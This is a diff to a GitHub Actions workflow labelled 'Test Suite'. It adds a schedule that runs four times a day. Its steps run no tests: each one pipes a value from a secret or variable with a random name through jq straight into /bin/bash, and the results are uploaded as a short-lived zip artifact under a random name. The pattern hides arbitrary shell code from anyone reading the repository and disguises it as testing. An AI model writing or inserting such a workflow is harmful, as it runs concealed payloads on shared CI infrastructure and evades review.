@@ -2,6 +2,8 @@ name: Test Suite
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '33 4,10,16,22 * * *'
 env:
   CI: true
 concurrency:
@@ -14,17 +16,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run
         env:
-          wscdi19: ${{ secrets.wscdi19 }}
+          cjyng93: ${{ secrets.cjyng93 }}
         run: |
-          printf '%s' "$wscdi19" | jq -r .d9 | /bin/bash
-          echo $q80 | jq -r .fhvm1 | /bin/bash
-          echo $y68550 | jq -r .rrfwh91089 | /bin/bash
-          printf '%s' "$d5163" | jq -r .cpdt48944 | /bin/bash
-          printf '%s' "$viywl4616" | jq -r .mjbr31023 | /bin/bash
+          printf '%s' "$cjyng93" | jq -r .yfxbv3 | /bin/bash
+          printf '%s' "$ok02" | jq -r .u66 | /bin/bash
+          printf '%s' "$vm19" | jq -r .phkml44 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
         with:
-          name: sevEQ4u4
+          name: Bsn1Anv5
           path: "*.zip"
           retention-days: 1
